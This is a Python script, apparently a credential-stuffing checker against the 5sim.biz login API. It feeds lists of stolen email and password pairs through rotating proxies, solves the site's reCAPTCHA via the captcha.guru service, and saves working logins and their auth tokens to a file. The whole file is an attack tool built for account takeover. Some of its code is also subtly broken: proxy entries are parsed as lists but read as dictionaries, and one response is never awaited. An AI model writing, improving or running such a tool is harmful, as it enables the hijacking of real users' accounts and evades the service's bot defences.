import asyncio
import aiohttp
import aiofiles
from pydantic import BaseModel



class Credentials(BaseModel):
    email: str
    password: str


class Valid(BaseModel):
    credentials: Credentials
    response_text: str


class Invalid(BaseModel):
    credentials: Credentials


class Checker:
    def __init__(self, token, proxies):
        self.solver = token
        self.proxies = proxies

    async def solve_recaptcha(self):
        async with aiohttp.ClientSession() as session:
            api_key = self.solver
            captcha_url = "https://5sim.biz/"
            sitekey = "6Lf5qwgTAAAAAKci_ZYBESf9Z_rQXtJbw7YSBBTt"
            method = "userrecaptcha"
            action = "get"

            data = {
                "key": api_key,
                "method": method,
                "googlekey": sitekey,
                "pageurl": captcha_url
            }
            async with session.get("http://api.captcha.guru/in.php", params=data) as resp:
                response_text = await resp.text()
                captcha_id = response_text.split("|")[-1]

            data = {
                "key": api_key,
                "action": action,
                "id": captcha_id
            }
            while True:
                async with session.get("http://api.captcha.guru/res.php", params=data) as resp:
                    response_text = await resp.text()
                    if response_text == "CAPCHA_NOT_READY":
                        await asyncio.sleep(1)
                    else:
                        captcha_code = response_text.split("|")[-1]
                        return captcha_code

    async def authenticate(self, session, email, password, proxy):
        proxy_url = f"http://{proxy['ip']}:{proxy['port']}"
        proxy_auth = aiohttp.BasicAuth(login=proxy.get('username'), password=proxy.get('password'))
        async with session.get('https://5sim.biz/v1/guest/csrf', proxy=proxy_url, proxy_auth=proxy_auth) as csrf_response:
            cookies = csrf_response.cookies

        captcha_code = await self.solve_recaptcha()

        json_data = {
            'email': email,
            'password': password,
            'captcha': captcha_code
        }

        async with session.post(
            'https://5sim.biz/v1/guest/auth/login',
            headers={'x-xsrf-token': cookies["XSRF-TOKEN"]},
            json=json_data,
            cookies=cookies,
            proxy=proxy_url,
            proxy_auth=proxy_auth
        ) as response:
            return response.text()

    async def use(self, session, credentials, proxy):
        email, password = credentials.email, credentials.password
        response_text = await self.authenticate(session, email, password, proxy)

        if "token" in response_text:
            valid_credentials = Valid(credentials=credentials, response_text=response_text)
            async with aiofiles.open('valid.txt', 'a') as valid_file:
                await valid_file.write(f"{valid_credentials.json()}\n")
        else:
            invalid_credentials = Invalid(credentials=credentials)
            async with aiofiles.open('invalid.txt', 'a') as invalid_file:
                await invalid_file.write(f"{invalid_credentials.json()}\n")

    async def run(self, accounts, proxies):
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i, credentials in enumerate(accounts):
                proxy_index = i % len(proxies)
                task = asyncio.create_task(self.use(session, credentials, proxies[proxy_index]))
                tasks.append(task)
            await asyncio.gather(*tasks)


async def main():
    token = 'token captcha.guru'

    async with aiofiles.open('proxy.txt', 'r') as f:
        proxies = [line.strip().split(':') for line in f]

    async with aiofiles.open('base.txt', 'r') as f:
        accounts = [Credentials.parse_raw(line.strip()) for line in f]

    chunks = [accounts[i:i+12] for i in range(0, len(accounts), 12)]
    for i, chunk in enumerate(chunks):
        checker = Checker(token, proxies[i % len(proxies)])
        await checker.run(chunk, proxies)

if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(main())